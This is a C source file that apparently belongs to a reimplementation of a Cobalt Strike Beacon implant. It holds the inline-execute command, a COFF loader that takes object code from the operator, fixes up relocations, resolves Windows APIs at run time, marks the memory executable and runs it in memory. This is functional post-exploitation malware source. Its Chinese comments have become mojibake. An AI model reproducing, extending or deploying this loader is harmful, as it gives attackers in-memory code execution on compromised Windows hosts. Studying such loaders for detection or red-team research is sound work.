#include "Bof.h"
#include "Command.h"

void* FindOrAddDynamicFunction(Beacon_Internal_Api* api, void* newFunction)
{
	int i;

	for (i = 0; i < 32; i++) {
		if (api->dynamicFns[i] == newFunction)
			return &(api->dynamicFns[i]);
	}

	for (i = 0; i < 32; i++) {
		if (api->dynamicFns[i] == NULL) {
			api->dynamicFns[i] = newFunction;
			return &(api->dynamicFns[i]);
		}
	}

	return NULL;
}

// ��֧�� x64 �����µ� coff ����
BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, unsigned char* lpCodeStart, unsigned char* lpCodeStartAddress, unsigned char* lpSection, unsigned long offsetInSection) {
	// ����ֱ��д pImageRelocation->relocType < 10
	// ��Ϊ relocType Ϊ unsigned short �޷���
	if (pImageRelocation->relocType >= 4 && pImageRelocation->relocType <= 9)
	{
			// ����������32���ƫ�ƣ����ж�ƫ���Ƿ��� -2GB - 2GB ��Χ��
		DWORD64 offset = *(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) + (DWORD64)(lpSection + offsetInSection) - (DWORD64)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX)
		{
			fprintf(stderr, "Relocation truncated to fit (distance between executable code and other data is >4GB)\n");
			return FALSE;
		}
		*(long*)(lpCodeStart + pImageRelocation->rvaddre) = *(long*)(lpCodeStart + pImageRelocation->rvaddre) + (long)(lpSection + offsetInSection) - (long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
	}
	else
	{
		fprintf(stderr, "Un-implemented relocation type %d", pImageRelocation->relocType);
		return FALSE;
	}

	return TRUE;
}

VOID CmdInlineExecute(unsigned char* commandBuf, size_t commandBuflen) {
	// Beacon �ڲ� API
	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
	if (!api) {
		fprintf(stderr, "Memoryt allocation failed\n");
		return;
	}
	BeaconInternalAPI(api);

	// ��ں���ƫ��
	datap parse;
	BeaconDataParse(&parse, commandBuf, commandBuflen);
	int entryPoint = BeaconDataInt(&parse);

	// �����
	sizedbuf codeBuf;
	unsigned char* code = BeaconDataLengthAndString(&parse, &codeBuf);
	int codeLength = codeBuf.size;

	// .rdata
	sizedbuf rdataBuf;
	unsigned char* rdata = BeaconDataLengthAndString(&parse, &rdataBuf);

	// .data
	sizedbuf dataBuf;
	unsigned char* data = BeaconDataLengthAndString(&parse, &dataBuf);

	// Beacon �Զ�����ض�λ�ṹ
	sizedbuf relocationsBuf;
	unsigned char* relocations = BeaconDataLengthAndString(&parse, &relocationsBuf);

	// ��ں�������
	sizedbuf bytesBuf;
	unsigned char* bytes = BeaconDataLengthAndString(&parse, &bytesBuf);

	unsigned char* lpCodeStartAddress = (unsigned char*)VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpCodeStartAddress)
	{
		fprintf(stderr, "VirtualAlloc failed with error:%lu\n\n", GetLastError());
		free(api);
		return;
	}

	datap relocationsParser;
	BeaconDataParse(&relocationsParser, relocations, relocationsBuf.size);

	for (BEACON_RELOCATION* reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(BEACON_RELOCATION));
		reloc->beaconRelocType.secType != END_RELOC_TYPE; reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(BEACON_RELOCATION))) {
		BOOL result;
		if (reloc->beaconRelocType.secType == RDATA_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, rdata, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == DATA_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, data, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == EXE_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, code, reloc->value);
		}
		else {
			// �ڲ�����
			// funcType �������
			if (reloc->beaconRelocType.funcType != DYNAMIC_FUNC_RELOC_TYPE) {
				result = processRelocation(reloc, code, lpCodeStartAddress, (unsigned char*)api + (reloc->beaconRelocType.funcType * sizeof(unsigned char*)), 0);
			}
			// �ⲿ������������ BEACON_RELOCATION �ṹ
			// ModuleLength(4 bytes) || ModuleString(ModuleLength bytes)
			// FunctionNameLength(4 bytes) || FunctionNameString(FunctionNameLength bytes)
			else {
				void* ptr;
				void* slot;
				LPSTR lpModuleName = BeaconDataStringPointer(&relocationsParser);
				LPSTR lpFuncName = BeaconDataStringPointer(&relocationsParser);
				HMODULE hModule = GetModuleHandleA(lpModuleName);
				if (!hModule) {
					LoadLibraryA(lpModuleName);
				}
				hModule = GetModuleHandleA(lpModuleName);
				if(!hModule)
				{
					fprintf(stderr, "Could not load module %s\n", lpModuleName);
					goto cleanup;
				}
				ptr = GetProcAddress(hModule, lpFuncName);
				if (!ptr)
				{
					fprintf(stderr, "Could not load API %s\n", lpFuncName);
					goto cleanup;
				}
				slot = FindOrAddDynamicFunction(api, ptr);
				if (!slot) {
					fprintf(stderr, "No slot for function (reduce number of Win32 APIs called)\n");
					goto cleanup;
				}
				result = processRelocation(reloc, code, lpCodeStartAddress, (unsigned char*)slot, 0);
			}
		}
		if (!result) goto cleanup;
	}
	memcpy(lpCodeStartAddress, code, codeLength);
	memset(code, 0, codeLength);

	DWORD oldProtect;
	// �޸��ڴ�Ȩ�� RWX
	if (!VirtualProtect(lpCodeStartAddress, codeLength, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		fprintf(stderr, "VirtualProtect failed with error:%lu\n", GetLastError());
		return;
	}
	// ִ����ں���
	((void(*)(unsigned char*, int))(lpCodeStartAddress + entryPoint))(bytes, bytesBuf.size);

cleanup:
	VirtualFree(lpCodeStartAddress, 0, MEM_RELEASE);
	free(api);
	return;
}